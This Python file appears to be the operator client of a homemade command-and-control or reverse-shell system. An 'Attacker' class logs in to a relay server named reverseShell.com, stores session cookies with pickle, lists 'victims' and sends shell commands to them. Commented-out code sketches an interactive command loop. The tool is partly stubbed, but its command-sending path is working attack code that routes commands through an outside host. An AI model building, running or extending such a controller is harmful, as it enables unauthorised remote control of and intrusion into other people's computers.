import requests
import logging
import pickle

class Attacker:

    # Try to load session cookies from file
    def __tryToLoadSessionCookies(self):
        # Try to load session cookies from file
        try:
            with open('cookies.dat', 'rb') as f:
                self.__session.cookies.update(pickle.load(f))
        except FileNotFoundError:
            pass

    # Do a login request to server
    def __login(self, session, url, type):
        return self.__session.request('GET', url, params={'login':1, 'type':type})

    # Save session cookies to file:
    def __writeSessionCookiesToFile(self):
        # Write cookies to file
        with open('cookies.dat', 'wb') as f:
            pickle.dump(self.__session.cookies, f)

    # Load session and log into the server. Return the connection response.
    def connectToServer(self, baseUrl):
        # Save server base url
        self.__serverUrl = baseUrl

        # Open session
        self.__session = requests.Session()

        # Try to load session cookies from file
        self.__tryToLoadSessionCookies()

        # Log in as attacker
        response = self.__login(self.__session, self.__serverUrl + '/login.php', 'attacker')

        # Save session cookies to file
        self.__writeSessionCookiesToFile()

        return response

    # Return a list of connected victims
    def listVictims(self):
        return self.__session.request('GET', self.__serverUrl + '/attacker/listVictims.php')

    def connectToVictim(self, victim):
        pass

    def sendCommand(self, command):
        return self.__session.request('POST',
                    self.__serverUrl + '/attacker/sendCommand.php',
                    data={'command':command})

    def disconnectFromVictim(self):
        pass

    def disconnectFromServer(self):
        return self.__session.request('GET', self.__serverUrl + '/login.php', headers={'Connection':'close'})



# Print response object
def printResponse(response):
    print(response.text, end='')

def main():
    # Module for connection debugging
    logging.basicConfig(level=logging.DEBUG)

    # Server domain
    baseUrl = 'http://www.reverseShell.com'

    # Store command
    data = {'cmd': None}

    attacker = Attacker()
    print('Requesting login...')
    printResponse(attacker.connectToServer(baseUrl))
    #print('Listing victims...')
    #victimsList = attacker.listVictims()
    #printResponse(victimsList)
    #attacker.connectToVictim(victimsList[0])
    printResponse(attacker.sendCommand('ls'))
    #print(output)
    #attacker.disconnectFromVictim()
    printResponse(attacker.disconnectFromServer())
    #printResponse(requests.request('GET', baseUrl + '/modules/sessionManager.php'))


    #print(s.cookies.get_dict())
    #print(response.content)
    #print(response.text)

    exit()

    '''
        while True:
            try:
                # Read command
                data['cmd'] = input()
                # Send command
                #response = requests.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
                response = s.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
                # Print response
                print(response.text)
            # If hit Ctrl+c
            except KeyboardInterrupt:
                raise SystemExit

    #print(response.status_code, response.reason)
    #print(response.content)
    #print(response.text)
    '''

if __name__ == "__main__":
    main()
